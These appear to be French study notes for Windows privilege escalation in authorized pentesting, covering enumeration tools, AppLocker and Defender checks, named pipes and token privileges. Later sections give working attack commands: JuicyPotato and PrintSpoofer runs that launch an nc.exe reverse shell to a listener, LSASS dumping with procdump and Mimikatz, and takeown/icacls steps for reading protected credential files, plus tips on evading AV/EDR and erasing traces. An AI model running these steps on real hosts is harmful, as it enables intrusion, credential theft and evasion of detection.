# Useful Tools

Voici une liste compacte d'outils utiles pour l'énumération et la recherche de pistes d'élévation de privilèges sur des hôtes Windows. Pour chaque outil : brève description + commande / usage typique.

## Outils d'énumération & post-exploitation
- **Seatbelt** — projet C# pour checks locaux variés (audit sécurité).  
  Usage : `Seatbelt.exe all` (ou exécuter avec `-output` pour sauvegarder).

- **winPEAS** — script (batch/PowerShell) qui recherche un grand nombre de vecteurs d'élévation (misconfig, services, permissions, scheduled tasks, credentials).  
  Usage : `winPEAS.bat` ou `PowerShell -ExecutionPolicy Bypass -File winPEAS.ps1`.

- **PowerUp** — script PowerShell (PowerUp.ps1) spécialisé dans les misconfig common (services vulnérables, DLL hijack, ACLs, scheduled tasks).  
  Usage : `Import-Module .\PowerUp.ps1; Invoke-AllChecks`.

- **SharpUp** — équivalent C#/binaire de PowerUp (utile si `powershell` limité).  
  Usage : exécuter `SharpUp.exe` et récupérer la sortie.

- **JAWS** — script PowerShell long-format (compatible PSv2) pour énumération complète.  
  Usage : `powershell -exec bypass -file .\jaws.ps1`.

## Récupération/gestion de credentials
- **LaZagne** — récupère mots de passe stockés localement (navigateurs, DB, applications, etc.).  
  Usage : `laZagne.exe all`.

- **SessionGopher** — récupère & décrypte sessions sauvegardées (PuTTY, WinSCP, RDP, …).  
  Usage : `SessionGopher.ps1` (PowerShell).

## Matching KBs / exploit suggestions
- **Watson** — .NET tool pour lister les KB manquants et suggérer exploits liés.  
  Usage : `watson.exe`.

- **Windows Exploit Suggester - Next Generation (WES-NG)** — prend la sortie de `systeminfo` et propose vulnérabilités / PoC connus.  
  Workflow : `systeminfo > sysinfo.txt` → analyser avec WES-NG.


## Outils Sysinternals (très pratiques)
- **AccessChk** — lister droits & permissions sur fichiers/keys/services.  
  Usage : `accesschk.exe -uws Users D:\some\file` ou `accesschk -accepteula -uwqv -s *`.

- **PsService / PsExec / PsList / PsInfo** — informations services/process, exécution distante (attention, PsExec peut laisser des artefacts).  
  Usage : `PsService.exe \\target query` ; `PsExec.exe -s -i cmd.exe` (si autorisé).

- **PipeList** — lister named pipes ouvertes (utile pour credential theft/exploits IPC).  
  Usage : `PipeList.exe`.

## Recommandations pratiques
- Toujours **compiler depuis la source** quand possible (évite détections/flags malveillants/prebuilt).  
- Exécuter d’abord en mode *lecture* (énumération) ; éviter d’exécuter exploits destructifs sur des systèmes de production.  
- Collecter la sortie dans des fichiers pour tri/post-analyse : `> results.txt`.  
- Si PowerShell restreint : utiliser versions encodées ou modules .NET/compiled (`SharpUp`, Seatbelt`).

---

# Getting the Lay of the Land

# Situational Awareness

## Objectif  
Lorsqu’on arrive sur un système (Windows ou Linux), il est essentiel de **comprendre l’environnement** avant toute action :  
- Quelles interfaces réseau ?  
- Quelles protections actives ?  
- Quelles restrictions applicatives ?  

Cette phase oriente les prochaines étapes (escalade, mouvements latéraux, ou persistance).

## Network Enumeration

### Vérifier interfaces, IP, DNS
Commande :
`ipconfig /all`

→ Donne :  
- Nom d’hôte / suffixe DNS  
- Interfaces réseau  
- IP / Masque / Gateway  
- Serveurs DNS  
- DHCP / DNS Suffix / WINS

> Si plusieurs interfaces (dual-homed host) → peut ouvrir une passerelle vers un autre réseau interne.

### Voir les connexions locales
Commande :
`arp -a`

→ Montre les hôtes récemment contactés (utile pour repérer machines d’administration via RDP/WinRM).

### Voir la table de routage
Commande :
`route print`

→ Indique :
- Routes actives (IPv4/IPv6)  
- Gateways  
- Interfaces et priorités  
> Peut révéler des sous-réseaux internes accessibles via ce poste.

## Protection & Security Enumeration

### Vérifier la présence d’un antivirus / EDR
Commande PowerShell :
`Get-MpComputerStatus`

→ Donne :
- Statut du service AV/AS  
- Versions du moteur & signatures  
- Modules actifs : *RealTimeProtectionEnabled*, *IoavProtectionEnabled*, etc.

> Permet d’adapter les outils : certains exploits / scripts peuvent être bloqués par l’EDR.

### Lister les règles AppLocker
Commande PowerShell :
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

→ Montre :
- Règles *Default Rules* (Program Files, Windows, etc.)  
- Qui peut exécuter quoi (groupes Everyone, Administrators, etc.)  
> Permet d’identifier si `cmd.exe`, `powershell.exe`, ou certains scripts sont bloqués.

### Tester une règle AppLocker spécifique
Commande PowerShell :
`Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

→ Renvoie *Allowed* ou *Denied* pour l’exécution du binaire spécifié.  
> Pratique pour tester si un contournement AppLocker sera nécessaire.

## Conseils pratiques
- Sauvegarder la sortie des commandes (`> enum.txt`) pour l’analyse hors ligne.  
- Identifier les domaines, contrôleurs AD, segments réseau adjacents.  
- Vérifier la configuration d’AV/EDR avant d’utiliser des outils comme PowerUp/SharpUp.  
- Adapter les scripts à l’environnement (modifier signatures, noms, chemins).  

---


# Initial Enumeration

## Objectif
Après avoir obtenu un shell basique sur un hôte Windows, le but est de **collecter un maximum d’informations** sur :
- le système et sa version,  
- les utilisateurs/groupes,  
- les services et logiciels,  
- les protections et chemins d’escalade possibles.  

Une bonne énumération manuelle = escalade plus rapide et moins risquée.

## Infos système

### Version et patchs
`systeminfo`  
→ Donne OS, build, patchs (KB), uptime, matériel, domaine, etc.  
> Si peu de hotfixes récents → possible vulnérabilité kernel/exploit public.

### Liste des correctifs
`wmic qfe`  
ou  
`powershell Get-HotFix | ft -AutoSize`

### Infos matérielles et programmes
`wmic product get name`  
ou  
`powershell Get-WmiObject -Class Win32_Product | select Name, Version`  
> Identifier logiciels vulnérables (Java, SQL Server, FileZilla, etc.).

## Services & processus

### Lister processus et services associés
`tasklist /svc`  
→ Identifier services privilégiés ou inhabituels (ex : `FileZilla Server.exe`, `IISADMIN`, etc.).  
> Chercher ceux exécutés comme `SYSTEM` ou `Administrator`.

### Voir ports ouverts / services exposés
`netstat -ano`  
→ Permet de repérer des services internes exploitables.

## Variables & configuration

### Lister variables d’environnement
`set`  
→ Vérifier `PATH`, `HOMEDRIVE`, `USERPROFILE`, etc.  
> Si un dossier *writable* est avant `C:\Windows\System32` → possible DLL hijacking.

## Utilisateurs & groupes

### Utilisateur actuel
`echo %USERNAME%`  
ou  
`whoami`

### Privilèges de l’utilisateur
`whoami /priv`  
→ Repérer privilèges sensibles (`SeImpersonatePrivilege`, etc.).

### Groupes de l’utilisateur
`whoami /groups`  
→ Vérifier appartenance à `Administrators`, `Remote Desktop Users`, etc.

### Utilisateurs connectés
`query user`  
→ Voir sessions actives (ex : `administrator` connecté via RDP).

### Lister tous les utilisateurs
`net user`

### Lister tous les groupes
`net localgroup`

### Détails d’un groupe (ex : Administrators)
`net localgroup administrators`

## Politique de mots de passe
`net accounts`  
→ Donne longueur min, âge max, verrouillage, etc.  
> Faible complexité = brute force possible.

## Points clés à surveiller
- Services tiers tournant en SYSTEM.  
- Logiciels obsolètes (Java, SQL, etc.).  
- Variables PATH modifiées.  
- Comptes admin ou “helpdesk” réutilisés.  
- Politiques faibles (mot de passe / verrous).

---

# Communication with Processes

## Objectif  
Comprendre comment les processus communiquent permet souvent d’identifier des **vecteurs d’escalade de privilèges**, via :
- Services réseau exposés localement (ports internes, API non sécurisées)  
- Named Pipes mal configurées (droits en écriture pour “Everyone”)  
- Tokens ou communications inter-process mal protégées  

## Access Tokens  
Chaque processus Windows possède un **token d’accès** qui définit :
- L’identité de l’utilisateur  
- Ses privilèges (`SeImpersonatePrivilege`, `SeDebugPrivilege`, etc.)  

Ces tokens peuvent être détournés pour obtenir des privilèges SYSTEM via des exploits comme **Juicy/Rogue Potato**.

## Network Services  

### Lister connexions et ports actifs  
`netstat -ano`  
→ Montre tous les ports TCP/UDP, états, et PID associés.  
Chercher :
- Ports locaux (`127.0.0.1` / `::1`) **non exposés** sur l’interface publique.  
- Services internes comme `FileZilla`, `Splunk`, `RabbitMQ`, `IIS`, etc.  
> Ces services sont souvent mal sécurisés car jugés “non exposés au réseau”.

Exemples classiques :  
- `127.0.0.1:14147` → interface admin FileZilla (extraction de mots de passe possible).  
- `Splunk Universal Forwarder` → exécution de code sans auth (ancien bug).  
- `Erlang Port 25672` (RabbitMQ, CouchDB, etc.) → cookies faibles (`rabbit`) exposés.  

## Named Pipes  

### Principe  
Les **Named Pipes** sont des canaux de communication entre processus :  
- `\\.\pipe\<nom>`  
- Peuvent être **half-duplex** (écriture seule) ou **duplex** (lecture/écriture).  
> Cobalt Strike les utilise massivement (ex : `\\.\pipe\msagent_12`).

### Lister les Named Pipes  
`pipelist.exe /accepteula`  
ou  
`powershell gci \\.\pipe\`  

→ Montre les pipes actives (ex : `lsass`, `spoolss`, `vmware-usbarbpipe`, etc.).  
> Chercher les pipes non standards ou en lien avec des services tiers.

### Vérifier les permissions sur une pipe  
`accesschk.exe /accepteula \\.\pipe\<nom> -v`  

Exemple :  
`accesschk.exe /accepteula \\.\pipe\lsass -v`  
→ Seuls les administrateurs ont accès complet.  
> Si “Everyone” a `WRITE` ou `FILE_ALL_ACCESS`, c’est exploitable.

### Rechercher des pipes vulnérables  
`accesschk.exe -accepteula -w \pipe\* -v`  
→ Lister les pipes accessibles en écriture.  
Exemple :  

```
RW Everyone FILE_ALL_ACCESS
```
Cela signifie que **tous les utilisateurs** peuvent écrire dedans → escalade SYSTEM possible. 

## Points clés à retenir
- Les **ports internes** (loopback) sont de bons candidats à exploiter (admin interfaces, API locales).
- Les **Named Pipes** sont une surface d’attaque souvent négligée.
- Utiliser **AccessChk** pour vérifier les permissions (`RW Everyone`). 
- Toujours recouper PID ↔ Processus via `tasklist /svc` ou `Get-Process`. 
- Si un service tourne avec `SeImpersonatePrivilege` → testez les *Potato exploits*.

--- 

# Windows Privileges Overview

## Définition  
Les **privilèges Windows** sont des droits système accordés à un compte pour exécuter certaines actions :  
- gérer des services,  
- charger des drivers,  
- déboguer des programmes,  
- accéder à des fichiers protégés, etc.  

Ils sont différents des **droits d’accès** (permissions sur objets) et sont stockés dans le **token d’accès** de chaque utilisateur.

> Les privilèges peuvent être **désactivés** par défaut et activés uniquement dans une session **élevée (Admin)**.

## Processus d’autorisation  
Lorsqu’un utilisateur tente d’accéder à une ressource :
1. Windows lit le **token** (User SID, Group SIDs, Privileges, etc.).  
2. Compare ces infos avec les **ACEs** de l’objet (liste des droits).  
3. Autorise ou bloque l’action.

L’exploitation consiste à **abuser de privilèges ou groupes** pour détourner ce processus.

## 👥 Groupes puissants (à surveiller)
| Groupe | Description / Risques |
|--------|------------------------|
| **Administrators** | Accès total au système |
| **Domain Admins / Enterprise Admins** | Contrôle total AD |
| **Server Operators** | Gèrent services, fichiers, partages SMB |
| **Backup Operators** | Peuvent copier SAM/NTDS, lire registre distant |
| **Print Operators** | Peuvent charger un driver malveillant |
| **Hyper-V Administrators** | Accès aux VMs (peut inclure DCs) |
| **Account Operators** | Modifient comptes non protégés |
| **Remote Desktop Users** | Accès RDP (souvent élargi en pratique) |
| **Remote Management Users** | Accès PowerShell Remoting |
| **Schema Admins** | Modifient le schéma AD |
| **DNS Admins** | Peuvent charger DLLs (persistance) |

## Principaux droits (User Rights Assignment)

| Constante | Nom | Groupes | Description |
|------------|------|----------|-------------|
| **SeNetworkLogonRight** | Accès via réseau | Admins, Users | Connexion via SMB, NetBIOS… |
| **SeRemoteInteractiveLogonRight** | Connexion RDP | Admins, RDP Users | Connexion via RDP |
| **SeBackupPrivilege** | Sauvegarder fichiers | Admins | Contourne ACL pour backup |
| **SeRestorePrivilege** | Restaurer fichiers | Admins | Restaure fichiers protégés |
| **SeTakeOwnershipPrivilege** | Prendre possession d’objets | Admins | Changer propriétaire d’un fichier |
| **SeDebugPrivilege** | Debug de processus | Admins | Attacher à n’importe quel processus |
| **SeImpersonatePrivilege** | Usurper un utilisateur | Admins, Services | Base des attaques Potato |
| **SeLoadDriverPrivilege** | Charger drivers | Admins | Code kernel exécutable |
| **SeTcbPrivilege** | Agir comme OS | Admins, Services | Impersonation complète (haut risque) |


## Ressources
- [Script pour activer les privilèges](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)
- [Script pour activer les privilèges](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)

---

## SeImpersonate & SeAssignPrimaryToken

**Ce que c’est**  
- Les tokens de processus décrivent le contexte de sécurité (qui exécute quoi).  
- `SeImpersonatePrivilege` permet à un processus d'« emprunter » (impersonate) le token d'un autre utilisateur après authentification.  
- `SeAssignPrimaryTokenPrivilege` permet de remplacer le token principal d'un processus (plus rare).  
- Ces privilèges sont souvent assignés à des services et sont la base des attaques *Potato* (Juicy/Rogue/PrintSpoofer) pour obtenir `NT AUTHORITY\SYSTEM`.

**Pourquoi ça nous intéresse**  
- Si un compte/service a `SeImpersonate` (même s’il n’est pas admin), on peut souvent forcer la création d’un processus SYSTEM via des outils publics.  
- Fréquent après RCE via web/app (webshell, `xp_cmdshell`, etc.) : vérifier immédiatement.

**Vérifier en premier**  
- Exécuter : `whoami /priv`  
- Chercher `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` en état `Enabled`.

**Flux d’exploitation (ex. JuicyPotato)**  
1. obtenir RCE (ex. via `xp_cmdshell` ou webshell).  
2. uploader `JuicyPotato.exe` et `nc.exe`.  
3. lancer un listener local : `nc -lnvp 8443`  
4. exécuter JuicyPotato :  
   `JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`  
5. si ça marche → shell `nt authority\system` sur votre listener.

**Alternatives (versions récentes)**
- `JuicyPotato` fonctionne mal/plus sur Win10 1809+ / Server 2019.  
- Utiliser `PrintSpoofer` ou `RoguePotato` (fonctionnent sur builds plus récentes) : exemple :  
  `PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.14.3 8443 -e cmd"`  
  → listener `nc -lnvp 8443` pour catcher la session SYSTEM.

### Ressources
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [RoguePotato](https://github.com/antonioCoco/RoguePotato)

---

## SeDebugPrivilege

**C’est quoi ?**  
- `SeDebugPrivilege` permet d’ouvrir/inspecter n’importe quel processus pour le débogage.  
- Par défaut réservé aux administrateurs — parfois donné à des développeurs/service accounts.  
- Très puissant : accès à la mémoire système (ex. LSASS) → récupération de credentials ou RCE en SYSTEM.

**Vérifier rapidement**  
- `whoami /priv` → chercher `SeDebugPrivilege` (Disabled = présent mais non actif dans le token actuel).

**Exploitation courante : dump LSASS → extraire mots de passe**
1. Dumper la mémoire de LSASS :  
   `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
2. Récupérer mots de passe NTLM/cleartext :  
   Dans Mimikatz :  
   `sekurlsa::minidump lsass.dmp`  
   `sekurlsa::logonPasswords`

*(si pas de binaires autorisés : via RDP → Task Manager → Details → Create dump file → télécharger et analyser localement)*

**Exploitation alternative : utiliser la capacité de debugging pour obtenir RCE SYSTEM**  
- PoC/outil courant : `psgetsystem` / script PowerShell qui utilise le parent PID SYSTEM.  
- Usage générique du PoC :  
  `[MyProcess]::CreateProcessFromParent(<system_pid>, <command_to_execute>, "")`  
- Exemple pratique : récupérer PID d’un process SYSTEM (`tasklist` ou `Get-Process`) puis lancer la commande pour créer un child process héritant du token SYSTEM.

**Autres outils / méthodes**
- Plusieurs PoC publics popent un shell SYSTEM quand `SeDebugPrivilege` est présent.  
- On peut aussi injecter/modifier un service/process pour exécuter un binaire en SYSTEM.

**Précautions**
- Actions très noisy et détectables (EDR/AV).  
- Dumping LSASS contient beaucoup de secrets — manipuler avec prudence et effacer traces.  
- Ne pas tester sur des environnements de production sans autorisation.

**Checklist rapide**
- `whoami /priv` → confirme la présence.  
- `tasklist` / `Get-Process` → choisir cible SYSTEM (ex. `winlogon.exe`, `lsass.exe`).  
- Si possible : `procdump` → Mimikatz pour récupérer credentials.  
- Sinon : PoC CreateProcessFromParent / psgetsystem / autres → obtenir shell SYSTEM.

### Ressources 
- [psgetsystem](https://github.com/decoder-it/psgetsystem)

--- 

## SeTakeOwnershipPrivilege

`SeTakeOwnershipPrivilege` permet à un utilisateur de **prendre possession** d’un objet sécurisable (fichiers NTFS, clés de registre, services, objets AD, imprimantes, etc.). 
Concrètement il donne le droit `WRITE_OWNER` sur l’objet — l’utilisateur peut en changer le propriétaire et ensuite modifier les ACL pour se donner l’accès. 
Par défaut attribué aux administrateurs ; rare pour un utilisateur standard, mais possible pour des comptes de services (ex : comptes de sauvegarde).

> Modifier la propriété/ACL d’objets sensibles peut interrompre des services ou casser des applis. Toujours obtenir l’accord client et documenter/annuler les changements si possible.

### Vérifier si on a le droit
- Voir les privilèges actuels : `whoami /priv`  
  Chercher `SeTakeOwnershipPrivilege` (si `Disabled` → présent mais non activé dans le token actuel).

### Activer le privilège dans le token courant
Windows n’active pas automatiquement tous les privilèges listés dans le token. 
On peut utiliser des scripts PowerShell publics pour activer les privilèges du token, par ex. :  
- Importer un module d’activation : `Import-Module .\Enable-Privilege.ps1`  
- Activer les privilèges : `.\EnableAllTokenPrivs.ps1`  
- Re-vérifier : `whoami /priv` (devrait montrer `SeTakeOwnershipPrivilege` = `Enabled`)

### Flux d’exploitation typique (lecture d’un fichier protégé)

1. **Choisir la cible** (ex. `C:\Department Shares\Private\IT\cred.txt`)  
   - Voir propriétaire / métadonnées :  
     `Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}`

2. **Vérifier l’ownership du répertoire** (optionnel) :  
   `cmd /c dir /q 'C:\Department Shares\Private\IT'`

3. **Prendre possession du fichier** :  
   `takeown /f 'C:\Department Shares\Private\IT\cred.txt'`  
   → message `SUCCESS: ... now owned by user "DOMAIN\you"`

4. **(Si nécessaire) modifier l’ACL pour se donner l’accès** :  
   `icacls 'C:\Department Shares\Private\IT\cred.txt' /grant youruser:F`  
   → `processed file... Successfully processed 1 files`

5. **Lire le fichier** :  
   `Get-Content 'C:\Department Shares\Private\IT\cred.txt'`  
   ou `cat 'C:\Department Shares\Private\IT\cred.txt'`

6. **Nettoyage / restitution** : documenter et, si possible, remettre propriétaire/ACL d’origine.

### Quand utiliser ce privilège ?
- Quand d’autres vecteurs sont bloqués (ex. pas d’exécution d’exploits, pas d’accès direct) et que l’accès à un fichier précis peut fournir credentials/clefs/secret nécessaires pour l’escalade.
- Exemples de cibles intéressantes : fichiers de config web (`web.config`), secrets (`cred*`, `password*`), bases KeePass (`.kdbx`), fichiers système (`%WINDIR%\system32\config\*`), fichiers de sauvegarde, clés SSH, etc.

### Exemples de fichiers souvent visés
- `c:\inetpub\wwwroot\web.config`  
- `%WINDIR%\system32\config\software.sav`  
- `%WINDIR%\repair\sam`  
- Fichiers `*.kdbx`, `creds.*`, `pass.*`, `*.pem` ou scripts contenant des secrets

---















